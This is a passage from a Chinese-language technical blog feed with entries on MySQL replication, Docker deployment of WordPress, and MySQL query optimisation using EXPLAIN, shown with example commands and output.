2;<br>set session auto_increment_increment=2;<br>set session auto_increment_offset = 2;<br>注：auto-increment-increment 和　auto-increment-offset　要写到配置文件　中，防止下次重启后失效．</p>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>mysql主从复制</title>
      <link href="/2018/09/28/mysql%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"/>
      <url>/2018/09/28/mysql%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<p>主从复制没什么复杂，了解一下</p><a id="more"></a><h1 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h1><p>主从复制，是用来建立一个和主数据库完全一样的数据库环境，称为从数据库；主数据库一般是准实时的业务数据库。</p><h1 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h1><ul><li>做数据的热备，作为后备数据库，主数据库服务器故障后，可切换到从数据库继续工作，避免数据丢失。</li><li>架构的扩展。业务量越来越大，I/O访问频率过高，单机无法满足，此时做多库的存储，降低磁盘I/O访问的频率，提高单个机器的I/O性能</li><li>读写分离，使数据库能支撑更大的并发。很多互联网公司都用到了这个。</li></ul><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><ul><li>1:主服务器凡运行语句,都产生一个二进制日志 binlog</li><li>2:从服务器不断读取主服务器的binlog</li><li>3:从主服务读取到的binlog,转换为自身可执行的relaylog,</li><li>4:执行relaylog</li></ul><h1 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h1><ul><li><p>1:首先确保主服务器打开二进制日志功能.<br>这样,主服务器一旦有数据变化,立即产生二进制日志.</p></li><li><p>2:从服务器也需要开启二进制日志和relay日志功能.<br>这样可以从主服务器读取binlog,并产生relaylog</p></li><li><p>3:在主服务器建立一个从服务器的账号,并授予数得上权限.</p></li><li><p>4: 指定从服务对应的主服务器,开启从服务器</p></li></ul><h1 id="实际配置"><a href="#实际配置" class="headerlink" title="实际配置"></a>实际配置</h1><p>可参考这篇<a href="https://www.cnblogs.com/a8457013/p/7819018.html" target="_blank" rel="noopener">文章</a></p><h1 id="日志格式"><a href="#日志格式" class="headerlink" title="日志格式"></a>日志格式</h1><p>主服务器的日志格式用哪种好?<br>有 statement,row, mixed3种,其中mixed是指前2种的混合.</p><ul><li>row</li></ul><p>以insert into xxtable values (x,y,z)为例,<br>影响: 1行,且为新增1行, 对于其他行没有影响.<br>这个情况,用row格式,直接复制磁盘上1行的新增变化.</p><p>以update xxtable set age=21 where name=’sss’;<br>这个情况,一般也只是影响1行. 用row也比较合适.</p><ul><li>statment</li></ul><p>以过年发红包,全公司的人,都涨薪100元.<br>update xxtable set salary=salary+100;<br>这个语句带来的影响,是针对每一行的, 因此磁盘上很多row都发生了变化.<br>此处,适合就statment格式的日志.</p><ul><li>mixed<br>2种日志,各有各的高效的地方,mysql提供了mixed类型.<br>可以根据语句的不同,而自动选择适合的日志格式.</li></ul>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>使用docker部署快速部署wordpress</title>
      <link href="/2018/09/28/%E4%BD%BF%E7%94%A8docker%E9%83%A8%E7%BD%B2%E5%BF%AB%E9%80%9F%E9%83%A8%E7%BD%B2wordpress/"/>
      <url>/2018/09/28/%E4%BD%BF%E7%94%A8docker%E9%83%A8%E7%BD%B2%E5%BF%AB%E9%80%9F%E9%83%A8%E7%BD%B2wordpress/</url>
      
        <content type="html"><![CDATA[<p>docker快速部署wordpress应用</p><a id="more"></a><h1 id="使用命令行"><a href="#使用命令行" class="headerlink" title="使用命令行"></a>使用命令行</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">​docker pull mysql</span><br><span class="line">​docker pull wordpress</span><br><span class="line">​docker run -d --name mysql -v mysql-data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=root -e MYSQL_DATABASE=wordpress mysql</span><br><span class="line">​docker run -d -e WORDPRESS_DB_HOST=mysql:3306 --link mysql -p 8090:80 wordpress</span><br></pre></td></tr></table></figure><h1 id="使用docker-compose"><a href="#使用docker-compose" class="headerlink" title="使用docker-compose"></a>使用docker-compose</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">version: <span class="string">'3'</span></span><br><span class="line"></span><br><span class="line">services:</span><br><span class="line"></span><br><span class="line">  wordpress:</span><br><span class="line">    image: wordpress</span><br><span class="line">    ports:</span><br><span class="line">      - 8080:80</span><br><span class="line">    environment:</span><br><span class="line">      WORDPRESS_DB_HOST: mysql</span><br><span class="line">      WORDPRESS_DB_PASSWORD: root</span><br><span class="line">    networks:</span><br><span class="line">      - my-bridge</span><br><span class="line"></span><br><span class="line">  mysql:</span><br><span class="line">    image: mysql</span><br><span class="line">    environment:</span><br><span class="line">      MYSQL_ROOT_PASSWORD: root</span><br><span class="line">      MYSQL_DATABASE: wordpress</span><br><span class="line">    volumes:</span><br><span class="line">      - mysql-data:/var/lib/mysql</span><br><span class="line">    networks:</span><br><span class="line">      - my-bridge</span><br><span class="line"></span><br><span class="line">volumes:</span><br><span class="line">  mysql-data:</span><br><span class="line"></span><br><span class="line">networks:</span><br><span class="line">  my-bridge:</span><br><span class="line">    driver: bridge</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>mysql优化之in,exists,count,group by和union</title>
      <link href="/2018/09/27/mysql%E4%BC%98%E5%8C%96%E4%B9%8Bin%E5%92%8Cexists/"/>
      <url>/2018/09/27/mysql%E4%BC%98%E5%8C%96%E4%B9%8Bin%E5%92%8Cexists/</url>
      
        <content type="html"><![CDATA[<p>慎用in和exists</p><a id="more"></a><h1 id="in"><a href="#in" class="headerlink" title="in"></a>in</h1><p>in 型子查询引出的陷阱</p><p>题: 在ecshop商城表中,查询6号栏目的商品, (注,6号是一个大栏目)<br>最直观的:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select goods_id,cat_id,goods_name from  goods <span class="built_in">where</span> cat_id <span class="keyword">in</span> (select</span><br><span class="line">cat_id from ecs_category <span class="built_in">where</span> parent_id=6);</span><br></pre></td></tr></table></figure></p><p>误区: 给我们的感觉是, 先查到内层的6号栏目的子栏目,如7,8,9,11<br>然后外层, cat_id in (7,8,9,11)</p><p>事实: 如下图, goods表全扫描, 并逐行与category表对照,看parent_id=6是否成立<br><img src="in.jpg" alt=""></p><p>原因: mysql的查询优化器,针对In型做优化,被改成了exists的执行效果.<br>当goods表越大时, 查询速度越慢.</p><p>改进: 用连接查询来代替子查询</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">explain select goods_id,g.cat_id,g.goods_name from  goods as g</span><br><span class="line"> inner join (select cat_id from ecs_category <span class="built_in">where</span> parent_id=6) as t</span><br><span class="line"> using(cat_id) \G</span><br><span class="line"></span><br><span class="line">内层 select cat_id from ecs_category <span class="built_in">where</span> parent_id=6 ; 用到Parent_id索引, 返回4行</span><br><span class="line">+--------+</span><br><span class="line">| cat_id |</span><br><span class="line">+--------+</span><br><span class="line">|      7 |</span><br><span class="line">|      8 |</span><br><span class="line">|      9 |</span><br><span class="line">|     11 |</span><br><span class="line">+--------+    形成结果,设为t</span><br><span class="line">*************************** 3. row ***************************</span><br><span class="line">           id: 2</span><br><span class="line">  select_type: DERIVED</span><br><span class="line">        table: ecs_category</span><br><span class="line">         <span class="built_in">type</span>: ref</span><br><span class="line">possible_keys: parent_id</span><br><span class="line">          key: parent_id</span><br><span class="line">      key_len: 2</span><br><span class="line">          ref:</span><br><span class="line">         rows: 4</span><br><span class="line">        Extra:</span><br><span class="line">3 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">第2次查询, </span><br><span class="line">t和 goods 通过 cat_id 相连, </span><br><span class="line">因为cat_id在 goods表中有索引, 所以相当于用7,8,911,快速匹配上 goods的行.</span><br><span class="line">*************************** 2. row ***************************</span><br><span class="line">           id: 1</span><br><span class="line">  select_type: PRIMARY</span><br><span class="line">        table: g</span><br><span class="line">         <span class="built_in">type</span>: ref</span><br><span class="line">possible_keys: cat_id</span><br><span class="line">          key: cat_id</span><br><span class="line">      key_len: 2</span><br><span class="line">          ref: t.cat_id</span><br><span class="line">         rows: 6</span><br><span class="line">        Extra:</span><br><span class="line"></span><br><span class="line">第1次查询 :</span><br><span class="line">是把上面2次的中间结果,直接取回.</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">           id: 1</span><br><span class="line">  select_type: PRIMARY</span><br><span class="line">        table: &lt;derived2&gt;</span><br><span class="line">         <span class="built_in">type</span>: ALL</span><br><span class="line">possible_keys: NULL</span><br><span class="line">          key: NULL</span><br><span class="line">      key_len: NULL</span><br><span class="line">          ref: NULL</span><br><span class="line">         rows: 4</span><br><span class="line">        Extra:</span><br></pre></td></tr></table></figure><h1 id="exists"><a href="#exists" class="headerlink" title="exists"></a>exists</h1><p>exists子查询<br>题: 查询有商品的栏目.<br>按上面的理解,我们用join来操作,如下:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select c.cat_id,cat_name from ecs_category as c inner join goods as g</span><br><span class="line">on c.cat_id=g.cat_id group by cat_name; 见下面query36</span><br></pre></td></tr></table></figure></p><p>优化1:  在group时, 用带有索引的列来group, 速度会稍快一些,另外,<br>用int型 比 char型 分组,也要快一些. 见下面query37</p><p>优化2: 在group时, 我们假设只取了A表的内容,group by 的列,尽量用A表的列,<br>会比B表的列要快. 见下面query38</p><p>优化3: 从语义上去优化<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select cat_id,cat_name from ecs_category </span><br><span class="line"><span class="built_in">where</span> exists(select *from  goods <span class="built_in">where</span>  goods.cat_id=ecs_category.cat_id) 见下面query40</span><br></pre></td></tr></table></figure></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">|       36 | 0.00039075 | select c.cat_id,cat_name from ecs_category as c inner</span><br><span class="line">join  goods as g on c.cat_id=g.cat_id group by cat_name</span><br><span class="line">              |</span><br><span class="line">|       37 | 0.00038675 | select c.cat_id,cat_name from ecs_category as c inner</span><br><span class="line">join  goods as g on c.cat_id=g.cat_id group by cat_id</span><br><span class="line">              |</span><br><span class="line">|       38 | 0.00035650 | select c.cat_id,cat_name from ecs_category as c inner</span><br><span class="line">join  goods as g on c.cat_id=g.cat_id group by c.cat_id</span><br><span class="line">              |</span><br><span class="line">|       40 | 0.00033500 | select cat_id,cat_name from ecs_category <span class="built_in">where</span> exists</span><br><span class="line">(select * from  goods <span class="built_in">where</span>  goods.cat_id=ecs_category.cat_id)</span><br></pre></td></tr></table></figure><h1 id="from-型子查询"><a href="#from-型子查询" class="headerlink" title="from 型子查询:"></a>from 型子查询:</h1><p>注意::内层from语句查到的临时表, 是没有索引的.<br>所以: from的返回内容要尽量少.</p><h1 id="count-优化"><a href="#count-优化" class="headerlink" title="count() 优化"></a>count() 优化</h1><p>误区:<br>1:myisam的count()非常快<br>答: 是比较快,.但仅限于查询表的”所有行”比较快, 因为Myisam对行数进行了存储.<br>一旦有条件的查询, 速度就不再快了.尤其是where条件的列上没有索引.</p><p>2: 假如,id&lt;100的商家都是我们内部测试的,我们想查查真实的商家有多少?<br>select count(<em>) from lx_com where id&gt;=100;  (1000多万行用了6.X秒)<br>小技巧:<br>select count(</em>) from lx_com; 快<br>select count(<em>) from lx_com where id&lt;100; 快<br>select count(</em>) frol lx_com -select count(<em>) from lx_com where id&lt;100; 快<br>select (select count(</em>) from lx_com) - (select count(*) from lx_com where id&lt;100)</p><h1 id="group-by"><a href="#group-by" class="headerlink" title="group by"></a>group by</h1><p>注意:<br>1:分组用于统计,而不用于筛选数据.<br>比如: 统计平均分,最高分,适合, 但用于筛选重复数据,则不适合.<br>以及用索引来避免临时表和文件排序</p><p>2:  以A,B表连接为例 ,主要查询A表的列,<br>那么 group by ,order by 的列尽量相同,而且列应该显示声明为A的列</p><h1 id="union优化"><a href="#union优化" class="headerlink" title="union优化"></a>union优化</h1><p>注意: union all 不过滤 效率提高,如非必须,请用union all<br>因为 union去重的代价非常高, 因此只能放在程序里去重.</p>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>mysql优化之学习explain分析sql语句</title>
      <link href="/2018/09/26/mysql%E4%BC%98%E5%8C%96%E4%B9%8B%E5%AD%A6%E4%B9%A0explain%E5%88%86%E6%9E%90sql%E8%AF%AD%E5%8F%A5/"/>
      <url>/2018/09/26/mysql%E4%BC%98%E5%8C%96%E4%B9%8B%E5%AD%A6%E4%B9%A0explain%E5%88%86%E6%9E%90sql%E8%AF%AD%E5%8F%A5/</url>
      
        <content type="html"><![CDATA[<p>explain的基本使用<br><a id="more"></a></p><h1 id="使用explain的原因"><a href="#使用explain的原因" class="headerlink" title="使用explain的原因"></a>使用explain的原因</h1><p>要优化sql语句，首先，我们需要研究以下几个问题</p><ul><li><p>1:  sql语句的时间花在哪儿?</p><p>  答: 等待时间 , 执行时间.<br>  这两个时间并非孤立的, 如果单条语句执行的快了,对其他语句的锁定的也就少了.<br>  所以,我们来分析如何降低执行时间.</p></li><li><p>2: sql语句的执行时间,又花在哪儿了?</p><p>  答：<br>  a: 查 —-&gt; 沿着索引查,甚至全表扫描<br>  b: 取 —-&gt; 查到行后,把数据取出来(sending data)</p></li><li><p>3: sql语句的优化思路？<br>  答: 不查, 通过业务逻辑来计算,<br>  比如论坛的注册会员数,我们可以根据前3个月统计的每天注册数, 用程序来估算.</p><p>  少查, 尽量精准数据,少取行. 我们观察新闻网站,评论内容等,一般一次性取列表 10-30条左右.</p><p>  必须要查,尽量走在索引上查询行.</p><p>  取时, 取尽量少的列.<br>  比如  select <em> from tableA,  就取出所有列, 不建议.<br>  比如  select </em> from tableA,tableB, 取出A,B表的所有列</p></li></ul><ul><li>4: 如果定量分析查的多少行,和是否沿着索引查?<br>  答: 用explain来分析</li></ul><h1 id="explain工具的介绍"><a href="#explain工具的介绍" class="headerlink" title="explain工具的介绍"></a>explain工具的介绍</h1><h2 id="id"><a href="#id" class="headerlink" title="id:"></a>id:</h2><p>代表select 语句的编号, 如果是连接查询,表之间是平等关系, select 编号都是1,从1开始. 如果某select中有子查询,则编号递增.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">mysql&gt; explain select goods_id,goods_name from  goods <span class="built_in">where</span> goods_id <span class="keyword">in</span> (sele</span><br><span class="line">   ct goods_id from  goods <span class="built_in">where</span> cat_id=4) \G</span><br><span class="line">   *************************** 1. row ***************************</span><br><span class="line">              id: 1</span><br><span class="line">     select_type: PRIMARY</span><br><span class="line">           table:  goods</span><br><span class="line">            <span class="built_in">type</span>: ALL</span><br><span class="line">   possible_keys: NULL</span><br><span class="line">             key: NULL</span><br><span class="line">         key_len: NULL</span><br><span class="line">             ref: NULL</span><br><span class="line">            rows: 31</span><br><span class="line">           Extra: Using <span class="built_in">where</span></span><br><span class="line">   *************************** 2. row ***************************</span><br><span class="line">              id: 2</span><br><span class="line">     select_type: DEPENDENT SUBQUERY</span><br><span class="line">           table:  goods</span><br><span class="line">            <span class="built_in">type</span>: unique_subquery</span><br><span class="line">   possible_keys: PRIMARY,cat_id</span><br><span class="line">             key: PRIMARY</span><br><span class="line">         key_len: 3</span><br><span class="line">             ref: func</span><br><span class="line">            rows: 1</span><br><span class="line">           Extra: Using <span class="built_in">where</span></span><br><span class="line">   2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure><h2 id="select-type-查询类型"><a href="#select-type-查询类型" class="headerlink" title="select_type: 查询类型"></a>select_type: 查询类型</h2><p><img src="查询类型.png" alt=""></p><h2 id="table-查询针对的表"><a href="#table-查询针对的表" class="headerlink" title="table: 查询针对的表"></a>table: 查询针对的表</h2><p>有可能是<br>实际的表名  如select <em> from t1;<br>表的别名    如 select </em> from t2 as tmp;<br>derived      如from型子查询时<br>null         直接计算得结果,不用走表</p><h2 id="possible-key"><a href="#possible-key" class="headerlink" title="possible_key:"></a>possible_key:</h2><p>可能用到的索引<br>注意: 系统估计可能用的几个索引,但最终,只能用1个.</p><h2 id="key"><a href="#key" class="headerlink" title="key :"></a>key :</h2><p>最终用的索引.</p><h2 id="key-len"><a href="#key-len" class="headerlink" title="key_len:"></a>key_len:</h2><p>使用的索引的最大长度</p><h2 id="type列"><a href="#type列" class="headerlink" title="type列:"></a>type列:</h2><p>是指查询的方式, 非常重要,是分析”查数据过程”的重要依据</p><h3 id="all"><a href="#all" class="headerlink" title="all:"></a>all:</h3><p>意味着从表的第1行,往后,逐行做全表扫描.,运气不好扫描到最后一行.</p><p>例: 把goods_name列上的索引去掉, 并根据goods_name来查询<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; explain select goods_name from goods <span class="built_in">where</span> goods_name=<span class="string">'诺基亚N85'</span> \G</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">           id: 1</span><br><span class="line">  select_type: SIMPLE</span><br><span class="line">        table: goods</span><br><span class="line">         <span class="built_in">type</span>: ALL</span><br><span class="line">possible_keys: NULL</span><br><span class="line">          key: NULL</span><br><span class="line">      key_len: NULL</span><br><span class="line">          ref: NULL</span><br><span class="line">         rows: 31</span><br><span class="line">        Extra: Using <span class="built_in">where</span></span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure></p><h3 id="index"><a href="#index" class="headerlink" title="index:"></a>index:</h3><p>比all性能稍好一点，<br>通俗的说: all 扫描所有的数据行,相当于data_all  index 扫描所有的索引节点,相当于index_all</p><p>２种情况可能出现：<br>１：索引覆盖的查询情况下, 能利用上索引,但是又必须全索引扫描.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; explain select goods_id from  goods <span class="built_in">where</span> goods_id=1 or goods_id+1&gt;20</span><br><span class="line">\G</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">           id: 1</span><br><span class="line">  select_type: SIMPLE</span><br><span class="line">        table:  goods</span><br><span class="line">         <span class="built_in">type</span>: index</span><br><span class="line">possible_keys: PRIMARY</span><br><span class="line">          key: PRIMARY</span><br><span class="line">      key_len: 3</span><br><span class="line">          ref: NULL</span><br><span class="line">         rows: 31</span><br><span class="line">        Extra: Using <span class="built_in">where</span>; Using index</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; explain select goods_id,click_count from  goods <span class="built_in">where</span> goods_id=1 or go</span><br><span class="line">ods_id+1&gt;20 \G</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">           id: 1</span><br><span class="line"> select_type: SIMPLE</span><br><span class="line">        table:  goods</span><br><span class="line">         <span class="built_in">type</span>: ALL</span><br><span class="line">possible_keys: PRIMARY</span><br><span class="line">          key: NULL</span><br><span class="line">      key_len: NULL</span><br><span class="line">          ref: NULL</span><br><span class="line">         rows: 31</span><br><span class="line">        Extra: Using <span class="built_in">where</span></span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure></p><p> 2: 是利用索引来进行排序,但取出所有的节点<br>    select goods_id from  goods order by goods_id desc;<br>    分析: 没有加where条件, 就得取所有索引节点,同时,又没有回行,只取索引节点.<br>    再排序,经过所有索引节点.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; explain select goods_id from  goods order by goods_id asc\G</span><br><span class="line">    *************************** 1. row ***************************</span><br><span class="line">               id: 1</span><br><span class="line">      select_type: SIMPLE</span><br><span class="line">            table:  goods</span><br><span class="line">             <span class="built_in">type</span>: index</span><br><span class="line">    possible_keys: NULL</span><br><span class="line">              key: PRIMARY</span><br><span class="line">          key_len: 3</span><br><span class="line">              ref: NULL</span><br><span class="line">             rows: 31</span><br><span class="line">            Extra: Using index</span><br><span class="line">    1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure><h3 id="range"><a href="#range" class="headerlink" title="range:"></a>range:</h3><p>意思是查询时,能根据索引做范围的扫描<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; explain select goods_id,goods_name,shop_price from  goods <span class="built_in">where</span> goods</span><br><span class="line">id &gt;25 \G</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">           id: 1</span><br><span class="line">  select_type: SIMPLE</span><br><span class="line">        table:  goods</span><br><span class="line">         <span class="built_in">type</span>: range</span><br><span class="line">possible_keys: PRIMARY</span><br><span class="line">          key: PRIMARY</span><br><span class="line">      key_len: 3</span><br><span class="line">          ref: NULL</span><br><span class="line">         rows: 8</span><br><span class="line">        Extra: Using <span class="built_in">where</span></span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">ref  意思是指 通过索引列,可以直接引用到某些数据行</span><br><span class="line">mysql&gt; explain select goods_id,goods_name from  goods <span class="built_in">where</span> cat_id=4 \G</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">           id: 1</span><br><span class="line">  select_type: SIMPLE</span><br><span class="line">        table:  goods</span><br><span class="line">         <span class="built_in">type</span>: ref</span><br><span class="line">possible_keys: cat_id</span><br><span class="line">          key: cat_id</span><br><span class="line">      key_len: 2</span><br><span class="line">          ref: const</span><br><span class="line">         rows: 3</span><br><span class="line">        Extra:</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure></p><p>在这个例子中,通过cat_id索引 指向N行goods数据,来查得结果.</p><h3 id="eq-ref"><a href="#eq-ref" class="headerlink" title="eq_ref"></a>eq_ref</h3><p>是指,通过索引列,直接引用某1行数据<br>常见于连接查询中<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; explain select goods_id,shop_price from  goods innert join ecs_catego</span><br><span class="line">y using(cat_id) <span class="built_in">where</span> goods_id&gt; 25 \G</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">           id: 1</span><br><span class="line">  select_type: SIMPLE</span><br><span class="line">        table: innert</span><br><span class="line">         <span class="built_in">type</span>: range</span><br><span class="line">possible_keys: PRIMARY,cat_id</span><br><span class="line">          key: PRIMARY</span><br><span class="line">      key_len: 3</span><br><span class="line">          ref: NULL</span><br><span class="line">         rows: 8</span><br><span class="line">        Extra: Using <span class="built_in">where</span></span><br><span class="line">*************************** 2. row ***************************</span><br><span class="line">           id: 1</span><br><span class="line">  select_type: SIMPLE</span><br><span class="line">        table: ecs_category</span><br><span class="line">         <span class="built_in">type</span>: eq_ref</span><br><span class="line">possible_keys: PRIMARY</span><br><span class="line">          key: PRIMARY</span><br><span class="line">      key_len: 2</span><br><span class="line">          ref: shop.innert.cat_id</span><br><span class="line">         rows: 1</span><br><span class="line">        Extra: Using index</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure></p><h3 id="const-system-null"><a href="#const-system-null" class="headerlink" title="const, system, null"></a>const, system, null</h3><p>这3个分别指查询优化到常量级别, 甚至不需要查找时间.</p><p>一般按照主键来查询时,易出现const,system<br>或者直接查询某个表达式,不经过表时, 出现NULL<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 